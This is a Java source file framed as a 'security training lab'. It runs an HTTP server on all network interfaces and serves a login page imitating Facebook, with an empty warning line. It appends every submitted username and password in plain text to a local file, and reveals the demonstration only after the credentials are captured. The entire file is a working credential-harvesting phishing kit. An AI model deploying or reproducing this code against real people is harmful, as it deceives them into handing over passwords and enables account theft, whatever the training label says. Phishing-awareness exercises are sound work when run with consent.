
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpServer;

import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardOpenOption;

public class PhishingLab {

    public static void main(String[] args) throws IOException {

        HttpServer server = HttpServer.create(
                new InetSocketAddress("0.0.0.0", 8021), 0);

        server.createContext("/", PhishingLab::showLoginPage);
        server.createContext("/submit", PhishingLab::handlePost);

        server.start();

        System.out.println("Security training lab running.");
        System.out.println("Local: http://localhost:8021");
        System.out.println("Use your LAB computer's IP address for another lab device.");
    }

    private static void showLoginPage(HttpExchange exchange) throws IOException {

        String html = """
                <!DOCTYPE html>
                <html>
                <head>
                    <title>Face Book</title>
                    <style>
                        body {
                            font-family: Arial;
                            background: #f0f2f5;
                            display: flex;
                            justify-content: center;
                            padding-top: 100px;
                        }

                        .box {
                            background: white;
                            padding: 30px;
                            width: 330px;
                            border-radius: 10px;
                            box-shadow: 0 2px 10px #aaa;
                        }

                        input {
                            width: 100%;
                            padding: 12px;
                            margin: 8px 0;
                            box-sizing: border-box;
                        }

                        button {
                            width: 100%;
                            padding: 12px;
                            background: #1877f2;
                            color: white;
                            border: 0;
                            cursor: pointer;
                            border-radius: 5px;
                        }

                        .warning {
                            color: #b00020;
                            font-size: 13px;
                        }
                    </style>
                </head>

                <body>
                    <div class="box">

                        <h2>Face Book Login</h2>

                        <p class="warning">
                          
                        </p>

                        <form method="POST" action="/submit">

                            <input
                                type="text"
                                name="username"
                                placeholder="Username"
                                required>

                            <input
                                type="password"
                                name="password"
                                placeholder="Password"
                                required>

                            <button type="submit">
                                Log In
                            </button>

                        </form>

                    </div>
                </body>
                </html>
                """;

        sendHtml(exchange, 200, html);
    }

    private static void handlePost(HttpExchange exchange) throws IOException {

        if (!exchange.getRequestMethod().equalsIgnoreCase("POST")) {
            exchange.getResponseHeaders().set("Allow", "POST");
            sendHtml(exchange, 405, "Method Not Allowed");
            return;
        }

        String body = new String(
                exchange.getRequestBody().readAllBytes(),
                StandardCharsets.UTF_8
        );

        String username = "";
        String password = "";

        String[] fields = body.split("&");

        for (String field : fields) {

            String[] parts = field.split("=", 2);

            if (parts.length == 2) {

                String key = URLDecoder.decode(
                        parts[0],
                        StandardCharsets.UTF_8
                );

                String value = URLDecoder.decode(
                        parts[1],
                        StandardCharsets.UTF_8
                );

                if (key.equals("username")) {
                    username = value;
                }

                if (key.equals("password")) {
                    password = value;
                }
            }
        }

        String record =
                "LAB TEST ONLY | Username: " + username +
                " | Password: " + password +
                System.lineSeparator();

        Files.writeString(
                Path.of("training-data.txt"),
                record,
                StandardOpenOption.CREATE,
                StandardOpenOption.APPEND
        );

        String response = """
                <!DOCTYPE html>
                <html>
                <head>
                    <title>Security Training Lab</title>
                </head>

                <body style="
                    font-family: Arial;
                    text-align: center;
                    padding-top: 100px;
                ">

                    <h2>Security Training Demonstration</h2>

                    <p>
                        The mock login information was received by
                        the training server.
                    </p>

                    <p>
                        This demonstrates why users should verify
                        links before entering credentials.
                    </p>

                    <a href="/">Return to training page</a>

                </body>
                </html>
                """;

        sendHtml(exchange, 200, response);
    }

    private static void sendHtml(
            HttpExchange exchange,
            int statusCode,
            String html) throws IOException {

        byte[] response =
                html.getBytes(StandardCharsets.UTF_8);

        exchange.getResponseHeaders().set(
                "Content-Type",
                "text/html; charset=UTF-8"
        );

        exchange.sendResponseHeaders(
                statusCode,
                response.length
        );

        try (OutputStream output = exchange.getResponseBody()) {
            output.write(response);
        }
    }
}
